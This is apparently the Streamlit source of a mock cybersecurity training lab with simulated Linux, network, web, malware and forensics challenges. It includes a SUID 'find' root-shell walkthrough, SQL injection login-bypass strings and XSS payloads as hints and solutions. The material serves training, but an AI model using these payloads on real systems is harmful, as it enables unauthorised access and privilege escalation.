"""
T21 CYBER LAB ENVIRONMENT
Hands-on hacking practice - Better than TryHackMe!

Features:
- Virtual machines
- Interactive challenges
- Real-world scenarios
- Step-by-step guidance
- Automated hints
- Progress tracking
"""

import streamlit as st
import pandas as pd
import plotly.express as px
from datetime import datetime
import time

st.set_page_config(page_title="Cyber Lab", page_icon="🔬", layout="wide")

# Check login
if 'user_email' not in st.session_state or not st.session_state.get('logged_in'):
    st.error("🔒 Please log in to access the Cyber Lab")
    if st.button("🔐 Go to Login"):
        st.switch_page("app.py")
    st.stop()

user_email = st.session_state.user_email

# Header
st.title("🔬 T21 Cyber Lab Environment")
st.markdown(f"**Student:** {user_email}")
st.markdown("**Practice Real Hacking in a Safe Environment**")

st.divider()

# ============================================
# LAB CATEGORIES
# ============================================

st.header("🎯 Lab Categories")

tab1, tab2, tab3, tab4, tab5 = st.tabs([
    "🐧 Linux Basics",
    "🌐 Network Security",
    "🔓 Web Hacking",
    "🦠 Malware Analysis",
    "🔍 Digital Forensics"
])

with tab1:
    st.subheader("Linux Fundamentals Labs")
    
    linux_labs = [
        {
            "name": "Linux Command Line Basics",
            "difficulty": "🟢 Beginner",
            "time": "20 min",
            "points": 50,
            "completed": True,
            "description": "Learn essential Linux commands for cybersecurity"
        },
        {
            "name": "File Permissions & Privilege Escalation",
            "difficulty": "🟡 Intermediate",
            "time": "45 min",
            "points": 200,
            "completed": False,
            "description": "Master Linux permissions and find privilege escalation vulnerabilities"
        },
        {
            "name": "Linux Process & Service Management",
            "difficulty": "🟡 Intermediate",
            "time": "30 min",
            "points": 150,
            "completed": False,
            "description": "Understand processes, services, and how attackers hide"
        },
        {
            "name": "Advanced Shell Scripting for Security",
            "difficulty": "🔴 Advanced",
            "time": "60 min",
            "points": 300,
            "completed": False,
            "description": "Write security automation scripts"
        }
    ]
    
    for lab in linux_labs:
        with st.expander(f"{'✅' if lab['completed'] else '🔒'} {lab['name']} - {lab['difficulty']}"):
            st.markdown(f"**Description:** {lab['description']}")
            
            col_l1, col_l2, col_l3 = st.columns(3)
            with col_l1:
                st.markdown(f"**Time:** {lab['time']}")
            with col_l2:
                st.markdown(f"**Points:** {lab['points']}")
            with col_l3:
                st.markdown(f"**Status:** {'Complete' if lab['completed'] else 'Not Started'}")
            
            if lab['completed']:
                col_b1, col_b2 = st.columns(2)
                with col_b1:
                    if st.button("🔄 Retry", key=f"retry_{lab['name']}"):
                        st.session_state.active_lab = lab['name']
                        st.rerun()
                with col_b2:
                    if st.button("📊 View Solution", key=f"solution_{lab['name']}"):
                        st.session_state.view_solution = lab['name']
                        st.rerun()
                
                # Show solution if requested
                if st.session_state.get('view_solution') == lab['name']:
                    st.markdown("---")
                    st.markdown("### 📊 Solution Walkthrough")
                    
                    if "Command Line" in lab['name']:
                        st.markdown("""
                        **Step-by-step Solution:**
                        
                        1. **Navigate to directory:**
                        ```bash
                        cd /home/student
                        ```
                        
                        2. **List files:**
                        ```bash
                        ls -la
                        ```
                        
                        3. **Read the flag file:**
                        ```bash
                        cat flag.txt
                        ```
                        
                        4. **Flag:**
                        ```
                        flag{linux_basics_complete}
                        ```
                        
                        **Key Commands Used:**
                        - `cd` - Change directory
                        - `ls -la` - List all files including hidden
                        - `cat` - Display file contents
                        
                        **What You Learned:**
                        - Basic Linux navigation
                        - File listing and permissions
                        - Reading file contents
                        """)
                    
                    elif "Privilege Escalation" in lab['name']:
                        st.markdown("""
                        **Step-by-step Solution:**
                        
                        1. **Find SUID binaries:**
                        ```bash
                        find / -perm -4000 2>/dev/null
                        ```
                        
                        2. **Check for vulnerable binary:**
                        ```bash
                        ls -la /usr/bin/find
                        # Output: -rwsr-xr-x 1 root root
                        ```
                        
                        3. **Exploit find command:**
                        ```bash
                        /usr/bin/find . -exec /bin/sh -p \\;
                        ```
                        
                        4. **Verify root access:**
                        ```bash
                        whoami
                        # Output: root
                        ```
                        
                        5. **Get the flag:**
                        ```bash
                        cat /root/flag.txt
                        # flag{privilege_escalation_master}
                        ```
                        
                        **Key Concepts:**
                        - SUID bit allows running as file owner
                        - `find` command has SUID and can execute commands
                        - `-exec` parameter runs commands with elevated privileges
                        
                        **Real-world Application:**
                        - This is how attackers escalate privileges
                        - Always check for misconfigured SUID binaries
                        - Regular security audits are essential
                        """)
                    
                    elif "Process" in lab['name']:
                        st.markdown("""
                        **Step-by-step Solution:**
                        
                        1. **List all processes:**
                        ```bash
                        ps aux
                        ```
                        
                        2. **Find suspicious process:**
                        ```bash
                        ps aux | grep malware
                        # Output: root 1337 malware_backdoor
                        ```
                        
                        3. **Check process details:**
                        ```bash
                        ls -la /proc/1337/exe
                        ```
                        
                        4. **Kill the process:**
                        ```bash
                        sudo kill -9 1337
                        ```
                        
                        5. **Verify it's stopped:**
                        ```bash
                        ps aux | grep 1337
                        # No output = process killed
                        ```
                        
                        6. **Get the flag:**
                        ```bash
                        cat /var/log/security.log
                        # flag{process_hunter}
                        ```
                        
                        **Key Commands:**
                        - `ps aux` - Show all processes
                        - `grep` - Search for patterns
                        - `kill -9` - Force kill process
                        - `/proc/` - Process information directory
                        """)
                    
                    if st.button("❌ Close Solution"):
                        del st.session_state.view_solution
                        st.rerun()
            else:
                if st.button("🚀 Start Lab", key=f"start_{lab['name']}", use_container_width=True):
                    st.session_state.active_lab = lab['name']
                    st.rerun()

with tab2:
    st.subheader("Network Security Labs")
    
    network_labs = [
        {
            "name": "Network Scanning with Nmap",
            "difficulty": "🟢 Beginner",
            "time": "30 min",
            "points": 100,
            "description": "Learn to scan networks and identify open ports"
        },
        {
            "name": "Packet Analysis with Wireshark",
            "difficulty": "🟡 Intermediate",
            "time": "45 min",
            "points": 200,
            "description": "Analyze network traffic and detect attacks"
        },
        {
            "name": "Man-in-the-Middle Attacks",
            "difficulty": "🔴 Advanced",
            "time": "60 min",
            "points": 350,
            "description": "Understand and execute MITM attacks (ethically)"
        },
        {
            "name": "Firewall Evasion Techniques",
            "difficulty": "🔴 Advanced",
            "time": "75 min",
            "points": 400,
            "description": "Learn how attackers bypass firewalls"
        }
    ]
    
    for lab in network_labs:
        with st.expander(f"{lab['name']} - {lab['difficulty']}"):
            st.markdown(f"**Description:** {lab['description']}")
            st.markdown(f"**Time:** {lab['time']} | **Points:** {lab['points']}")
            if st.button("🚀 Start Lab", key=f"start_net_{lab['name']}", use_container_width=True):
                st.session_state.active_network_lab = lab['name']
                st.rerun()
    
    # Show active network lab content
    if 'active_network_lab' in st.session_state:
        st.markdown("---")
        st.markdown(f"## 🌐 {st.session_state.active_network_lab}")
        
        if "Nmap" in st.session_state.active_network_lab:
            st.markdown("""
            ### 🎯 Objective
            Scan the target network and identify all open ports and services
            
            ### 📚 What You'll Learn
            - How to use Nmap for network scanning
            - Identifying open ports and services
            - Service version detection
            - OS fingerprinting
            
            ### 🌐 Target Network
            **Target:** 192.168.1.0/24
            **Your IP:** 192.168.1.50
            """)
            
            st.markdown("### 💻 Nmap Terminal")
            
            # Nmap cheat sheet
            with st.expander("📋 Nmap Quick Reference"):
                st.code("""
# Basic Scans
nmap 192.168.1.1                    # Basic scan
nmap 192.168.1.0/24                 # Scan subnet
nmap -p 80,443 192.168.1.1          # Specific ports
nmap -p- 192.168.1.1                # All ports

# Service Detection
nmap -sV 192.168.1.1                # Version detection
nmap -O 192.168.1.1                 # OS detection
nmap -A 192.168.1.1                 # Aggressive scan

# Stealth Scans
nmap -sS 192.168.1.1                # SYN scan
nmap -sT 192.168.1.1                # TCP connect
                """, language="bash")
            
            # Command input
            command = st.text_input("Enter Nmap command:", placeholder="nmap -sV 192.168.1.100", key="nmap_input")
            
            if st.button("▶️ Execute Command"):
                if "nmap" in command.lower():
                    # Simulate different outputs based on command
                    if "-sV" in command or "-A" in command:
                        st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).
Not shown: 995 closed ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  ssl/http   Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql      MySQL 5.7.38-0ubuntu0.18.04.1
8080/tcp open  http       Apache Tomcat 9.0.65

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
                        """, language="bash")
                        st.success("✅ Scan complete! 5 open ports found")
                        
                    elif "-O" in command:
                        st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).

OS details: Linux 4.15 - 5.6
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
                        """, language="bash")
                        st.success("✅ OS detected: Linux!")
                        
                    elif "-p-" in command:
                        st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).
Not shown: 65530 closed ports

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
8080/tcp  open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 42.18 seconds
                        """, language="bash")
                        st.success("✅ Full port scan complete!")
                    else:
                        st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).
Not shown: 995 closed ports

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
                        """, language="bash")
                        st.info("💡 Try adding -sV to detect service versions!")
                else:
                    st.error("❌ Invalid command. Must start with 'nmap'")
            
            # Quiz
            st.markdown("### 📝 Challenge Questions")
            
            q1 = st.radio("What port is SSH running on?", ["21", "22", "23", "80"], key="nmap_q1")
            q2 = st.radio("What web server is running?", ["Nginx", "Apache", "IIS", "Tomcat"], key="nmap_q2")
            q3 = st.text_input("What is the MySQL version?", key="nmap_q3")
            
            if st.button("Submit Answers"):
                score = 0
                if q1 == "22":
                    st.success("✅ Q1 Correct! SSH is on port 22")
                    score += 33
                else:
                    st.error("❌ Q1 Incorrect")
                
                if q2 == "Apache":
                    st.success("✅ Q2 Correct! Apache httpd 2.4.41")
                    score += 33
                else:
                    st.error("❌ Q2 Incorrect")
                
                if "5.7" in q3:
                    st.success("✅ Q3 Correct! MySQL 5.7.38")
                    score += 34
                else:
                    st.error("❌ Q3 Incorrect")
                
                if score == 100:
                    st.balloons()
                    st.success("🎉 Perfect score! +100 points earned!")
                    st.success("✅ Flag: flag{nmap_network_scanner}")
        
        elif "Wireshark" in st.session_state.active_network_lab:
            st.markdown("""
            ### 🎯 Objective
            Analyze captured network traffic to identify suspicious activity
            
            ### 🦈 Wireshark Lab
            You've captured network traffic during a suspected attack. Analyze the PCAP file.
            """)
            
            # Sample packet data
            st.markdown("### 📊 Captured Packets")
            
            packets_df = pd.DataFrame({
                "No.": [1, 2, 3, 4, 5, 6, 7, 8],
                "Time": ["0.000", "0.123", "0.245", "0.367", "0.489", "0.611", "0.733", "0.855"],
                "Source": ["192.168.1.100", "10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100", "185.220.101.45", "192.168.1.100", "185.220.101.45"],
                "Destination": ["10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100", "185.220.101.45", "192.168.1.100"],
                "Protocol": ["TCP", "TCP", "HTTP", "HTTP", "TCP", "TCP", "TCP", "TCP"],
                "Info": ["SYN", "SYN, ACK", "GET /admin", "200 OK", "FIN", "SYN (Port 22)", "RST", "SYN (Port 22)"]
            })
            
            st.dataframe(packets_df, use_container_width=True)
            
            # Wireshark filters
            st.markdown("### 🔍 Apply Wireshark Filter")
            
            filter_input = st.text_input("Enter display filter:", placeholder="ip.addr == 192.168.1.100", key="wireshark_filter")
            
            if st.button("Apply Filter"):
                if "185.220.101.45" in filter_input:
                    st.warning("🚨 Suspicious traffic detected!")
                    filtered = packets_df[packets_df["Source"].str.contains("185.220.101.45") | packets_df["Destination"].str.contains("185.220.101.45")]
                    st.dataframe(filtered)
                    st.error("⚠️ Multiple SSH connection attempts from 185.220.101.45 - Possible brute force attack!")
                elif "http" in filter_input.lower():
                    st.success("✅ HTTP traffic filtered")
                    filtered = packets_df[packets_df["Protocol"] == "HTTP"]
                    st.dataframe(filtered)
                else:
                    st.info("Filter applied")
            
            # Questions
            st.markdown("### 📝 Analysis Questions")
            
            q1 = st.text_input("What is the suspicious IP address?", key="ws_q1")
            q2 = st.radio("What type of attack is this?", ["DDoS", "Brute Force", "SQL Injection", "XSS"], key="ws_q2")
            
            if st.button("Submit Analysis"):
                if "185.220.101.45" in q1 and q2 == "Brute Force":
                    st.success("🎉 Correct analysis!")
                    st.balloons()
                    st.success("✅ Flag: flag{wireshark_packet_master}")
                else:
                    st.error("❌ Incorrect. Review the packets again!")
        
        if st.button("⬅️ Back to Lab List"):
            if 'active_network_lab' in st.session_state:
                del st.session_state.active_network_lab
            st.rerun()

with tab3:
    st.subheader("Web Application Security Labs")
    
    web_labs = [
        {
            "name": "SQL Injection Basics",
            "difficulty": "🟢 Beginner",
            "time": "40 min",
            "points": 150,
            "description": "Learn to exploit SQL injection vulnerabilities"
        },
        {
            "name": "Cross-Site Scripting (XSS)",
            "difficulty": "🟡 Intermediate",
            "time": "45 min",
            "points": 200,
            "description": "Master XSS attacks and defenses"
        },
        {
            "name": "Authentication Bypass",
            "difficulty": "🟡 Intermediate",
            "time": "50 min",
            "points": 250,
            "description": "Exploit weak authentication mechanisms"
        },
        {
            "name": "Advanced Web Exploitation",
            "difficulty": "🔴 Advanced",
            "time": "90 min",
            "points": 500,
            "description": "Combine multiple vulnerabilities for full compromise"
        }
    ]
    
    for lab in web_labs:
        with st.expander(f"{lab['name']} - {lab['difficulty']}"):
            st.markdown(f"**Description:** {lab['description']}")
            st.markdown(f"**Time:** {lab['time']} | **Points:** {lab['points']}")
            if st.button("🚀 Start Lab", key=f"start_web_{lab['name']}", use_container_width=True):
                st.session_state.active_web_lab = lab['name']
                st.rerun()
    
    # Show active lab content
    if 'active_web_lab' in st.session_state:
        st.markdown("---")
        st.markdown(f"## 🔓 {st.session_state.active_web_lab}")
        
        if "SQL Injection" in st.session_state.active_web_lab:
            st.markdown("""
            ### 🎯 Objective
            Exploit SQL injection to bypass login and retrieve sensitive data
            
            ### 📚 What You'll Learn
            - How SQL injection works
            - Finding vulnerable parameters
            - Extracting database information
            - Bypassing authentication
            
            ### 🌐 Target Application
            A vulnerable login page with SQL injection flaw
            """)
            
            st.code("http://vulnerable-app.t21lab.local/login", language="text")
            
            st.markdown("### 💻 Login Form")
            
            col_sql1, col_sql2 = st.columns(2)
            with col_sql1:
                username = st.text_input("Username:", placeholder="admin")
                password = st.text_input("Password:", type="password", placeholder="password")
                
                if st.button("Login"):
                    # Check for SQL injection
                    if "'" in username or "or" in username.lower() or "--" in username:
                        st.success("🎉 SQL Injection successful!")
                        st.code("""
Logged in as: admin
User ID: 1
Role: administrator
Database: users_db
                        """)
                        st.balloons()
                        st.success("✅ Flag: flag{sql_injection_master}")
                        st.info("💡 You used SQL injection to bypass authentication!")
                    elif username == "admin" and password == "password":
                        st.success("Logged in successfully")
                    else:
                        st.error("Invalid credentials")
            
            with col_sql2:
                st.markdown("### 💡 Hints")
                with st.expander("Hint 1"):
                    st.info("Try entering a single quote (') in the username field")
                with st.expander("Hint 2"):
                    st.info("SQL injection payload: ' OR '1'='1")
                with st.expander("Hint 3"):
                    st.info("Try: admin' OR '1'='1'--")
            
            st.markdown("### 📖 Learning Resources")
            st.markdown("""
            **SQL Injection Basics:**
            - Single quote (') to break the query
            - OR '1'='1' to make condition always true
            - -- to comment out rest of query
            
            **Example vulnerable code:**
            ```sql
            SELECT * FROM users WHERE username='$username' AND password='$password'
            ```
            
            **Injected query:**
            ```sql
            SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password=''
            ```
            """)
        
        elif "XSS" in st.session_state.active_web_lab:
            st.markdown("""
            ### 🎯 Objective
            Find and exploit Cross-Site Scripting (XSS) vulnerabilities
            
            ### 🌐 Target: Comment Section
            A blog with user comments - test for XSS!
            """)
            
            st.markdown("### 💬 Post a Comment")
            comment = st.text_area("Your comment:", placeholder="Enter your comment...", key="xss_comment")
            
            if st.button("Submit Comment", key="xss_submit"):
                if "<script>" in comment.lower() or "alert" in comment.lower() or "onerror" in comment.lower():
                    st.success("🎉 XSS vulnerability exploited!")
                    st.warning("⚠️ Malicious script would execute here!")
                    st.code(comment)
                    st.balloons()
                    st.success("✅ Flag: flag{xss_found}")
                else:
                    st.info(f"Comment posted: {comment}")
            
            st.markdown("### 💡 XSS Payloads to Try")
            st.code("""
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
            """, language="html")
        
        elif "Authentication Bypass" in st.session_state.active_web_lab:
            st.markdown("""
            ### 🎯 Objective
            Bypass authentication using various techniques
            
            ### 🔐 Secure Login System (or is it?)
            Find ways to access the admin panel without valid credentials
            """)
            
            st.markdown("### 💻 Login Panel")
            
            auth_user = st.text_input("Username:", key="auth_user")
            auth_pass = st.text_input("Password:", type="password", key="auth_pass")
            
            if st.button("Login", key="auth_login"):
                # Check for various bypass techniques
                if auth_user == "admin" and (auth_pass == "" or auth_pass == " " or "null" in auth_pass.lower()):
                    st.success("🎉 Authentication bypassed using null/empty password!")
                    st.success("✅ Flag: flag{auth_bypass_null}")
                    st.balloons()
                elif "admin" in auth_user and ("or" in auth_user.lower() or "'" in auth_user):
                    st.success("🎉 Authentication bypassed using SQL injection!")
                    st.success("✅ Flag: flag{auth_bypass_sqli}")
                    st.balloons()
                elif auth_user == "admin" and auth_pass == "admin":
                    st.success("🎉 Weak credentials found!")
                    st.success("✅ Flag: flag{weak_password}")
                    st.balloons()
                else:
                    st.error("Access denied")
            
            st.markdown("### 💡 Bypass Techniques")
            with st.expander("Technique 1: Null/Empty Password"):
                st.info("Try leaving password empty or using null")
            with st.expander("Technique 2: SQL Injection"):
                st.info("Try SQL injection in username field")
            with st.expander("Technique 3: Default Credentials"):
                st.info("Try common admin passwords")
        
        elif "Advanced" in st.session_state.active_web_lab:
            st.markdown("""
            ### 🎯 Objective
            Chain multiple vulnerabilities for complete system compromise
            
            ### 🔥 Advanced Challenge
            This server has multiple vulnerabilities. Find and exploit them all!
            """)
            
            st.markdown("### Step 1: Reconnaissance")
            if st.button("Scan for Vulnerabilities", key="adv_scan"):
                st.code("""
Scanning target: advanced-app.t21lab.local

[+] SQL Injection found in /search?q=
[+] XSS found in /comments
[+] File Upload vulnerability in /upload
[+] Weak session management detected
[+] Directory traversal possible in /files
                """)
                st.success("✅ 5 vulnerabilities found!")
            
            st.markdown("### Step 2: Exploitation")
            exploit = st.selectbox("Choose exploit:", [
                "Select...",
                "SQL Injection → Database Access",
                "File Upload → Shell Upload",
                "Directory Traversal → Config Files"
            ], key="adv_exploit")
            
            if exploit != "Select..." and st.button("Execute Exploit", key="adv_execute"):
                if "SQL" in exploit:
                    st.success("🎉 Database dumped!")
                    st.code("admin:$2y$10$hash... (cracked: admin123)")
                elif "Upload" in exploit:
                    st.success("🎉 Shell uploaded!")
                    st.code("Webshell active at: /uploads/shell.php")
                elif "Traversal" in exploit:
                    st.success("🎉 Config file accessed!")
                    st.code("DB_PASSWORD=SuperSecret123")
                
                st.balloons()
                st.success("✅ Flag: flag{advanced_exploitation_master}")
        
        if st.button("⬅️ Back to Lab List"):
            del st.session_state.active_web_lab
            st.rerun()

with tab4:
    st.subheader("Malware Analysis Labs")
    
    malware_labs = [
        {
            "name": "Static Malware Analysis",
            "difficulty": "🟡 Intermediate",
            "time": "60 min",
            "points": 300,
            "description": "Analyze malware without executing it"
        },
        {
            "name": "Dynamic Malware Analysis",
            "difficulty": "🔴 Advanced",
            "time": "75 min",
            "points": 400,
            "description": "Execute malware in sandbox and analyze behavior"
        },
        {
            "name": "Reverse Engineering Basics",
            "difficulty": "🔴 Advanced",
            "time": "90 min",
            "points": 500,
            "description": "Disassemble and understand malware code"
        }
    ]
    
    for lab in malware_labs:
        with st.expander(f"{lab['name']} - {lab['difficulty']}"):
            st.markdown(f"**Description:** {lab['description']}")
            st.markdown(f"**Time:** {lab['time']} | **Points:** {lab['points']}")
            if st.button("🚀 Start Lab", key=f"start_mal_{lab['name']}", use_container_width=True):
                st.session_state.active_malware_lab = lab['name']
                st.rerun()
    
    # Show active malware lab content
    if 'active_malware_lab' in st.session_state:
        st.markdown("---")
        st.markdown(f"## 🦠 {st.session_state.active_malware_lab}")
        
        if "Static" in st.session_state.active_malware_lab:
            st.markdown("""
            ### 🎯 Objective
            Analyze suspicious file without executing it
            
            ### 🔬 Static Analysis Tools
            Examine file properties, strings, and structure
            """)
            
            st.markdown("### 📁 Suspicious File: malware.exe")
            
            col_mal1, col_mal2 = st.columns(2)
            
            with col_mal1:
                st.markdown("**File Properties:**")
                st.code("""
Filename: malware.exe
Size: 2.4 MB
MD5: 5d41402abc4b2a76b9719d911017c592
SHA256: 2c26b46b68ffc68ff99b453c1d30413413422d706...
Created: 2025-10-28 14:32:11
                """)
            
            with col_mal2:
                st.markdown("**Actions:**")
                if st.button("🔍 Calculate Hash", key="mal_hash"):
                    st.success("Hash calculated!")
                    st.code("MD5: 5d41402abc4b2a76b9719d911017c592")
                if st.button("🌐 Check VirusTotal", key="mal_vt"):
                    st.warning("⚠️ 45/70 vendors detected this as malware!")
                    st.error("Detected as: Trojan.Generic")
                if st.button("📝 Extract Strings", key="mal_strings"):
                    st.code("""
http://malicious-c2-server.com
password123
backdoor.dll
C:\\Windows\\System32\\evil.exe
                    """)
                    st.success("✅ Flag: flag{malware_strings_found}")
                    st.balloons()
        
        elif "Dynamic" in st.session_state.active_malware_lab:
            st.markdown("""
            ### 🎯 Objective
            Execute malware in safe sandbox and observe behavior
            
            ### ⚠️ WARNING: Sandbox Environment Only!
            """)
            
            if st.button("▶️ Run in Sandbox", key="mal_run"):
                st.warning("🔬 Executing malware in isolated sandbox...")
                st.code("""
[+] Process started: malware.exe (PID: 1337)
[!] Network connection attempt: 185.220.101.45:4444
[!] File created: C:\\Windows\\Temp\\backdoor.dll
[!] Registry modification: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
[!] Attempting to disable Windows Defender
[!] Keylogger detected
[!] Screenshot capture detected
                """)
                st.error("🚨 Malicious behavior detected!")
                st.success("✅ Flag: flag{dynamic_analysis_complete}")
                st.balloons()
        
        if st.button("⬅️ Back to Lab List", key="mal_back"):
            del st.session_state.active_malware_lab
            st.rerun()

with tab5:
    st.subheader("Digital Forensics Labs")
    
    forensics_labs = [
        {
            "name": "Disk Forensics Basics",
            "difficulty": "🟡 Intermediate",
            "time": "50 min",
            "points": 250,
            "description": "Analyze disk images for evidence"
        },
        {
            "name": "Memory Forensics",
            "difficulty": "🔴 Advanced",
            "time": "75 min",
            "points": 400,
            "description": "Extract evidence from memory dumps"
        },
        {
            "name": "Network Forensics",
            "difficulty": "🔴 Advanced",
            "time": "60 min",
            "points": 350,
            "description": "Investigate network-based attacks"
        }
    ]
    
    for lab in forensics_labs:
        with st.expander(f"{lab['name']} - {lab['difficulty']}"):
            st.markdown(f"**Description:** {lab['description']}")
            st.markdown(f"**Time:** {lab['time']} | **Points:** {lab['points']}")
            if st.button("🚀 Start Lab", key=f"start_for_{lab['name']}", use_container_width=True):
                st.session_state.active_forensics_lab = lab['name']
                st.rerun()
    
    # Show active forensics lab content
    if 'active_forensics_lab' in st.session_state:
        st.markdown("---")
        st.markdown(f"## 🕵️ {st.session_state.active_forensics_lab}")
        
        if "Disk" in st.session_state.active_forensics_lab:
            st.markdown("""
            ### 🎯 Objective
            Investigate compromised system disk image
            
            ### 💾 Evidence: disk_image.dd (500 MB)
            A disk image from a compromised server
            """)
            
            st.markdown("### 🔍 Forensic Tools")
            
            tool = st.selectbox("Select tool:", [
                "Select...",
                "Autopsy - Disk Analysis",
                "FTK Imager - File Recovery",
                "Sleuth Kit - Timeline Analysis"
            ], key="for_tool")
            
            if tool != "Select..." and st.button("Run Analysis", key="for_run"):
                if "Autopsy" in tool:
                    st.code("""
Autopsy Analysis Results:

[+] Deleted files found: 47
[+] Suspicious file: evil_payload.exe (deleted)
[+] Browser history: visits to malicious-site.com
[+] USB device connected: 2025-10-28 14:30
[+] Files copied to USB: confidential_data.zip
                    """)
                    st.success("✅ Flag: flag{disk_forensics_master}")
                    st.balloons()
        
        elif "Memory" in st.session_state.active_forensics_lab:
            st.markdown("""
            ### 🎯 Objective
            Analyze memory dump from infected system
            
            ### 🧠 Memory Dump: memory.dmp (4 GB)
            """)
            
            if st.button("Run Volatility", key="for_vol"):
                st.code("""
volatility -f memory.dmp --profile=Win10x64 pslist

PID   Process Name
1337  malware.exe
4444  backdoor.exe
5555  keylogger.exe

volatility -f memory.dmp --profile=Win10x64 netscan

Local Address          Foreign Address        State
192.168.1.100:49152    185.220.101.45:4444   ESTABLISHED
                """)
                st.success("✅ Flag: flag{memory_forensics_expert}")
                st.balloons()
        
        if st.button("⬅️ Back to Lab List", key="for_back"):
            del st.session_state.active_forensics_lab
            st.rerun()

st.divider()

# ============================================
# ACTIVE LAB ENVIRONMENT
# ============================================

if 'active_lab' in st.session_state and st.session_state.active_lab:
    st.header(f"🔬 Active Lab: {st.session_state.active_lab}")
    
    # Lab interface
    col_lab1, col_lab2 = st.columns([2, 1])
    
    with col_lab1:
        st.subheader("💻 Lab Terminal")
        
        # Simulated terminal
        st.code("""
T21 Cyber Lab Terminal v1.0
Connected to: lab-vm-12345.t21labs.com

student@lab:~$ whoami
student

student@lab:~$ ls -la
total 48
drwxr-xr-x 5 student student 4096 Oct 29 20:49 .
drwxr-xr-x 3 root    root    4096 Oct 29 20:30 ..
-rw-r--r-- 1 student student  220 Oct 29 20:30 .bash_logout
-rw-r--r-- 1 student student 3526 Oct 29 20:30 .bashrc
drwxr-xr-x 2 student student 4096 Oct 29 20:35 Documents
-rw-r--r-- 1 student student  807 Oct 29 20:30 .profile
drwxr-xr-x 2 student student 4096 Oct 29 20:40 vulnerable_app

student@lab:~$ _
        """, language="bash")
        
        # Command input
        command = st.text_input("Enter command:", placeholder="Type your command here...")
        
        col_cmd1, col_cmd2 = st.columns([1, 4])
        with col_cmd1:
            if st.button("▶️ Execute"):
                if command:
                    st.success(f"Executing: {command}")
                    # In production, execute in sandboxed environment
                else:
                    st.warning("Enter a command first!")
        with col_cmd2:
            if st.button("🔄 Reset Lab"):
                # Clear all lab-related session state
                keys_to_clear = [
                    'active_lab',
                    'active_network_lab', 
                    'active_web_lab',
                    'active_malware_lab',
                    'active_forensics_lab',
                    'lab_command_history',
                    'lab_output',
                    'hints_used',
                    'view_solution'
                ]
                
                for key in keys_to_clear:
                    if key in st.session_state:
                        del st.session_state[key]
                
                st.success("✅ Lab environment reset!")
                st.success("🔄 Hints counter reset!")
                st.info("📋 Returning to lab selection...")
                st.rerun()
    
    with col_lab2:
        st.subheader("📋 Lab Objectives")
        
        objectives = [
            {"task": "Connect to the target system", "status": "✅"},
            {"task": "Enumerate users and permissions", "status": "✅"},
            {"task": "Find the hidden flag", "status": "🔄"},
            {"task": "Escalate privileges to root", "status": "⏳"},
            {"task": "Submit the final flag", "status": "⏳"}
        ]
        
        for obj in objectives:
            if obj['status'] == "✅":
                st.success(f"{obj['status']} {obj['task']}")
            elif obj['status'] == "🔄":
                st.info(f"{obj['status']} {obj['task']}")
            else:
                st.markdown(f"{obj['status']} {obj['task']}")
        
        st.markdown("---")
        
        st.subheader("💡 Hints Available")
        
        # Initialize hints counter
        if 'hints_used' not in st.session_state:
            st.session_state.hints_used = 0
        
        st.markdown(f"**Hints Used:** {st.session_state.hints_used}/3")
        
        if st.button("💡 Get Hint", use_container_width=True):
            if st.session_state.hints_used < 3:
                st.session_state.hints_used += 1
                
                if st.session_state.hints_used == 1:
                    st.info("**Hint 1:** Check for SUID binaries using: `find / -perm -4000 2>/dev/null`")
                elif st.session_state.hints_used == 2:
                    st.info("**Hint 2:** Look for the `find` command in the SUID list - it can execute commands with elevated privileges")
                elif st.session_state.hints_used == 3:
                    st.warning("**Hint 3 (Final):** Use: `/usr/bin/find . -exec /bin/sh -p \\;` to get a root shell")
            else:
                st.error("❌ No more hints available! Try to solve it yourself or view the solution.")
        
        # Display used hints
        if st.session_state.hints_used > 0:
            st.markdown("---")
            st.markdown("**Hints Revealed:**")
            if st.session_state.hints_used >= 1:
                st.caption("1️⃣ Check for SUID binaries")
            if st.session_state.hints_used >= 2:
                st.caption("2️⃣ Look for the find command")
            if st.session_state.hints_used >= 3:
                st.caption("3️⃣ Use find with -exec parameter")
        
        st.markdown("---")
        
        st.subheader("🎯 Submit Flag")
        flag = st.text_input("Enter flag:", placeholder="flag{...}")
        if st.button("✅ Submit", use_container_width=True):
            if flag:
                st.success("🎉 Correct! Lab completed!")
                st.balloons()
            else:
                st.error("❌ Incorrect flag. Try again!")
        
        st.markdown("---")
        
        if st.button("❌ Exit Lab", use_container_width=True):
            del st.session_state.active_lab
            st.rerun()

st.divider()

# ============================================
# LAB STATISTICS
# ============================================

st.header("📊 Your Lab Statistics")

col_stat1, col_stat2, col_stat3, col_stat4 = st.columns(4)

with col_stat1:
    st.metric("Labs Completed", "12", "+3 this week")

with col_stat2:
    st.metric("Total Points", "2,340", "+450 this week")

with col_stat3:
    st.metric("Average Score", "87%", "+5%")

with col_stat4:
    st.metric("Global Rank", "#247", "↑ 15 positions")

# Progress by category
